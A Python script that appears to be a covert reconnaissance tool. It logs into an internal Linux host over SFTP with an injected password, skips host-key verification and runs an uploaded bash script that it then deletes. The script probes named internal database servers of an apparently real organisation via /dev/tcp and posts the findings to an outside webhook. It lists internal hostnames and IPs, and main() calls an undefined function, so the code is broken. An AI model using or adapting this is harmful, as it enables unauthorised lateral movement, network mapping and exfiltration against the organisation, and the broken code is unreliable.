#!/usr/bin/env python3
"""SSH bridge VDI -> debapp@10.0.135.81 via WinSCP's command-line.

WinSCP ships winscp.com (the COM/CLI variant) with `/command` support:
  winscp.com /command "open sftp://USER:PWD@HOST -hostkey=*" "call CMD" "exit"

`call CMD` runs arbitrary shell on the SSH/SFTP server side and returns
stdout, with no keys required and no persistent traces on the host
(other than known_hosts on the WinSCP side — and `-hostkey=*` even skips
that). This lets us probe what's reachable from the GP coordinator box.

Injected: WEBHOOK, BRIDGE_PWD. READ-ONLY.
"""
import json
import os
import shutil
import subprocess
import sys
import time

if sys.platform == 'win32':
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass

WEBHOOK = "__WEBHOOK__"
BRIDGE_PWD = "__BRIDGE_PWD__"
HOST = "10.0.135.81"
USER = "debapp"

TARGETS = [
    ("10.0.135.20",               1433, "SIMAH_MSCRM (UAT CRM)"),
    ("DBMSTRUAT.ksacb.com.sa",    1450, "SIMAH_UNIFIED"),
    ("DBSIMAHUAT1.ksacb.com.sa",  1450, "Moarif/LEIPortal/LINQ2SIMAH/KSAPOC"),
    ("DBUATCJ2.ksacb.com.sa",     1450, "UAT_B2C* / AMSConsumer"),
    ("DBUATCJ2.ksacb.com.sa",     1451, "InstantUpdate"),
    ("DBUATCJ2.ksacb.com.sa",     1452, "Identity"),
    ("DBUATCJ2.ksacb.com.sa",     1453, "Enquiry"),
    ("DEVDB01.ksacb.com.sa",      1450, "IdentityLei"),
    ("TRUAT01.ksacb.com.sa",      1450, "KSATR"),
    ("DQUATIDQ.ksacb.com.sa",     1450, "SIMAHDQ / EDWH"),
    ("SYBDWHUATHQ.ksacb.com.sa",  5000, "Sybase SIMAHDWH"),
]


def post_card(title, body, url):
    card = {"type": "message", "attachments": [{
        "contentType": "application/vnd.microsoft.card.adaptive",
        "content": {"$schema": "http://adaptivecards.io/schemas/adaptive-card.json",
                    "type": "AdaptiveCard", "version": "1.4",
                    "body": [{"type": "TextBlock", "text": title, "weight": "Bolder", "wrap": True},
                             {"type": "TextBlock", "text": body, "wrap": True, "fontType": "Monospace"}]}}]}
    if sys.platform == 'win32':
        import tempfile
        fd, tmp = tempfile.mkstemp(suffix='.json')
        with os.fdopen(fd, 'wb') as f:
            f.write(json.dumps(card, ensure_ascii=False).encode('utf-8'))
        ps = ("$proxy=[System.Net.WebRequest]::GetSystemWebProxy();"
              "$proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;"
              "[System.Net.WebRequest]::DefaultWebProxy=$proxy;"
              f"$b=[System.IO.File]::ReadAllBytes('{tmp}');"
              f"try{{Invoke-RestMethod -Uri '{url}' -Method Post -ContentType 'application/json; charset=utf-8' -Body $b|Out-Null;Write-Host 'OK'}}catch{{Write-Host 'FAIL';exit 1}}")
        r = subprocess.run(['powershell', '-NoProfile', '-NonInteractive', '-Command', ps],
                           capture_output=True, text=True, timeout=60)
        try: os.remove(tmp)
        except Exception: pass
        return 200 if r.returncode == 0 else 599
    import urllib.request
    req = urllib.request.Request(url, data=json.dumps(card).encode(),
                                 headers={"Content-Type": "application/json; charset=utf-8"}, method="POST")
    with urllib.request.urlopen(req, timeout=30) as resp:
        return resp.status


def find_winscp_com():
    cands = [
        os.path.join(os.environ.get("LOCALAPPDATA", ""), "Programs", "WinSCP", "winscp.com"),
        os.path.join(os.environ.get("LOCALAPPDATA", ""), "Programs", "WinSCP", "WinSCP.com"),
        r"C:\Program Files\WinSCP\winscp.com",
        r"C:\Program Files (x86)\WinSCP\winscp.com",
        shutil.which("winscp.com") or "",
    ]
    for c in cands:
        if c and os.path.isfile(c):
            return c
    return None


def url_encode_pwd(p):
    # winscp accepts pwd in URL — special chars must be %-encoded
    import urllib.parse
    return urllib.parse.quote(p, safe="")


def winscp_run(winscp, commands, timeout=180):
    """Run a series of WinSCP scripting commands (open, put, call, get, rm, ...).
    Returns (rc, stdout, stderr)."""
    args = [winscp, "/log=NUL", "/loglevel=0", "/nointeractiveinput", "/command"] + commands
    try:
        p = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except Exception as e:
        return -1, "", f"{type(e).__name__}: {e}"


def upload_run_remove(winscp, script_text):
    """Write script to a local temp file, upload via WinSCP, execute via `call`,
    remove from remote. Returns (rc, stdout-of-winscp, stderr)."""
    import tempfile
    pwd = url_encode_pwd(BRIDGE_PWD)
    remote_name = f"/tmp/recon_{int(time.time())}.sh"
    open_cmd = f'open sftp://{USER}:{pwd}@{HOST}/ -hostkey=*'
    fd, local_path = tempfile.mkstemp(suffix=".sh", prefix="recon_")
    # write LF line endings (Unix) regardless of platform
    with os.fdopen(fd, "wb") as f:
        f.write(script_text.replace("\r\n", "\n").encode("utf-8"))
    try:
        cmds = [
            open_cmd,
            f'put "{local_path}" "{remote_name}"',
            f'call chmod +x {remote_name}',
            f'call bash {remote_name}',
            f'call rm -f {remote_name}',
            'close',
            'exit',
        ]
        return winscp_run(winscp, cmds, timeout=240)
    finally:
        try: os.remove(local_path)
        except Exception: pass


def main():
    utc = time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime())
    out = [f"winscp_bridge_recon v1 @ {utc}", f"target: {USER}@{HOST}"]

    winscp = find_winscp_com()
    out.append(f"winscp.com: {winscp or 'NOT FOUND'}")
    if not winscp:
        body = "\n".join(out)
        print(body)
        if WEBHOOK.startswith("http"):
            post_card(f"🛰 winscp-bridge recon · {utc}", body[:17000], WEBHOOK)
        return 1

    # Build a single recon script (one open, many calls, one exit)
    recon = [
        "hostname",
        "id",
        "hostname -I",
        "uname -a",
        "command -v sqlcmd || echo 'sqlcmd: missing'",
        "command -v tsql || echo 'tsql: missing'",
        "command -v isql || echo 'isql: missing'",
        "command -v python3 || echo 'python3: missing'",
        "python3 -c 'import pyodbc; print(\"pyodbc\", pyodbc.version)' 2>&1 || echo 'pyodbc: missing'",
        "python3 -c 'import pymssql; print(\"pymssql\", pymssql.__version__)' 2>&1 || echo 'pymssql: missing'",
    ]
    # TCP probes via bash /dev/tcp
    for host, port, label in TARGETS:
        # 4s wait then kill; print OPEN/REFUSED/TIMEOUT
        recon.append(
            f"(echo > /dev/tcp/{host}/{port}) 2>/dev/null & p=$!; "
            f"(sleep 4; kill -9 $p 2>/dev/null) & "
            f"wait $p 2>/dev/null; rc=$?; "
            f"if [ $rc -eq 0 ]; then echo \"TCP {host}:{port} OPEN [{label}]\"; "
            f"else echo \"TCP {host}:{port} BLOCKED rc=$rc [{label}]\"; fi"
        )

    out.append("")
    out.append("=== remote run ===")
    rc, so, se = winscp_call(winscp, recon, timeout=300)
    out.append(f"winscp rc={rc}")
    if so: out.append("--- stdout ---\n" + so.strip())
    if se: out.append("--- stderr ---\n" + se.strip())

    body = "\n".join(out)
    print(body[:5000])

    if WEBHOOK.startswith("http"):
        try:
            print("[selfpost]", post_card(f"🛰 winscp-bridge recon · {utc}", body[:17000], WEBHOOK))
        except Exception as ex:
            print("[selfpost] FAIL:", ex)
    print("=== done ===")


if __name__ == "__main__":
    main()
